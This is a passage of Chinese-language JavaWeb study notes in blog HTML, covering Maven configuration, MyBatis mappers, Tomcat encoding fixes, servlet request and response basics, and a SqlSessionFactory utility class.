    <content type="html"><![CDATA[<h1 id="JavaWeb基础1-1"><a href="#JavaWeb基础1-1" class="headerlink" title="JavaWeb基础1-1"></a>JavaWeb基础1-1</h1><h2 id="一、Maven"><a href="#一、Maven" class="headerlink" title="一、Maven"></a>一、Maven</h2><p>常用的Maven仓库</p><p>用pom.xml文件表示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>New_Maven_1<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--Tomcat--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.maven<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat7-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span>8080<span class="hljs-tag">&lt;/<span class="hljs-name">port</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">path</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">path</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--servlet--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--IO流工具类--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.11.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--Mybatis--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--MySQL--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.33<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--JSP--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jsp-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--JSTL/jsp依赖--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--JSTL依赖--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>taglibs<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>standard<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!--fastjson--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.83<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="二、MyBatis"><a href="#二、MyBatis" class="headerlink" title="二、MyBatis"></a>二、MyBatis</h2><p>优秀的持久层框架，简化JDBC的开发</p><p>JavaEE的三层：表现层、业务层、持久层</p><p>可以理解为Java程序与数据库的连接和交换方式</p><h2 id="三、Mapper"><a href="#三、Mapper" class="headerlink" title="三、Mapper"></a>三、Mapper</h2><h4 id="首先注意映射关系，如图："><a href="#首先注意映射关系，如图：" class="headerlink" title="首先注意映射关系，如图："></a>首先注意映射关系，如图：</h4><p><img src="/img/JavaWeb/1-1/Mapper1.png"></p><h4 id="1、写在xml文件中的方法"><a href="#1、写在xml文件中的方法" class="headerlink" title="1、写在xml文件中的方法"></a>1、写在xml文件中的方法</h4><p>BrandMapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.study.mapper.BrandMapper&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;brandResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;brand&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;brand_name&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;brandName&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;company_name&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;companyName&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><p>BrandMapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.study.mapper;<br><br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.ResultMap;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Select;<br><span class="hljs-keyword">import</span> com.study.pojo.Brand;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BrandMapper</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 查询所有</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Select(&quot;select * from tb_brand&quot;)</span><br>    <span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span><br>    List&lt;Brand&gt; <span class="hljs-title function_">selectAll</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="2、全部写在注释中的方法"><a href="#2、全部写在注释中的方法" class="headerlink" title="2、全部写在注释中的方法"></a>2、全部写在注释中的方法</h4><p>UserMapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;User.mapper.UserMapper&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><p>UserMapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> User.mapper;<br><span class="hljs-keyword">import</span> User.pojo.User;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Insert;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Param;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Select;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 根据用户名和密码查询用户对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> username</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> password</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125; and password = #&#123;password&#125;&quot;)</span><br>    User <span class="hljs-title function_">select</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username, <span class="hljs-meta">@Param(&quot;password&quot;)</span> String password)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 根据用户名查询用户对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> username</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125;&quot;)</span><br>    User <span class="hljs-title function_">selectByUsername</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 添加用户</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> user</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Insert(&quot;insert into tb_user values(null,#&#123;username&#125;,#&#123;password&#125;)&quot;)</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(User user)</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="四、Tomcat"><a href="#四、Tomcat" class="headerlink" title="四、Tomcat"></a>四、Tomcat</h2><h3 id="一个网络服务框架"><a href="#一个网络服务框架" class="headerlink" title="一个网络服务框架"></a>一个网络服务框架</h3><p>可以本地配置，也可以Maven导入一个插件</p><p>同时注意，Tomcat9及之前的版本默认的编码格式不是UTF-8，是ISO-8859-1，Tomcat10是UTF-8，可能会出现中文乱码的问题</p><p>GET的解决方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/resp3&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseDemo3</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;张三&quot;</span>;<br>        <span class="hljs-comment">//1.URL编码</span><br><span class="hljs-comment">//        String encode = URLEncoder.encode(username, &quot;utf-8&quot;);</span><br><span class="hljs-comment">//        System.out.println(encode);</span><br>        <span class="hljs-comment">//2.URL解码</span><br><span class="hljs-comment">//        String decode = URLDecoder.decode(username, &quot;utf-8&quot;);</span><br><span class="hljs-comment">//        System.out.println(decode);</span><br>        <span class="hljs-comment">//3.转化为字节数据</span><br><span class="hljs-comment">//        byte[] bytes = decode.getBytes(&quot;ISO-8859-1&quot;);</span><br><span class="hljs-comment">//        for(byte b : bytes) &#123;</span><br><span class="hljs-comment">//            System.out.println(b + &quot; &quot;);</span><br><span class="hljs-comment">//        &#125;</span><br>        <span class="hljs-comment">//4.将字节数组转化为字符串</span><br><span class="hljs-comment">//        String s = new String(bytes, &quot;utf-8&quot;);</span><br><span class="hljs-comment">//        System.out.println(s);</span><br><br>        <span class="hljs-comment">//一行代码解决</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(username.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;utf-8&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POST的解决方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/resp3&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseDemo3</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>        <span class="hljs-comment">//设置字符输入流的编码，这样就可以了</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="五、Servlet"><a href="#五、Servlet" class="headerlink" title="五、Servlet"></a>五、Servlet</h2><h3 id="1、Request和Response"><a href="#1、Request和Response" class="headerlink" title="1、Request和Response"></a>1、Request和Response</h3><p>使用Request对象来【获取请求】数据</p><p>使用Response对象来【设置相应】数据</p><p>一般格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/resp2&quot;)</span><br><span class="hljs-comment">//Web访问的路径</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseDemo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//设置响应类型</span><br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>        <span class="hljs-comment">//通过Response对象获取输出流</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>        <span class="hljs-comment">//写数据</span><br>        writer.write(<span class="hljs-string">&quot;resp2&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2、SqlSessionFactory"><a href="#2、SqlSessionFactory" class="headerlink" title="2、SqlSessionFactory"></a>2、SqlSessionFactory</h3><p>一般要抽取一个SqlSessionFactory工具类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlSessionFactoryUtils</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> SqlSessionFactory sqlSessionFactory;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-comment">//静态代码块会随着类的加载而自动执行，且只执行一次</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;mybatis-config.xml&quot;</span>;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Resources.getResourceAsStream(resource);<br>            sqlSessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBuilder</span>().build(inputStream);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SqlSessionFactory <span class="hljs-title function_">getSqlSessionFactory</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> sqlSessionFactory;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>相关的调用和替代：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 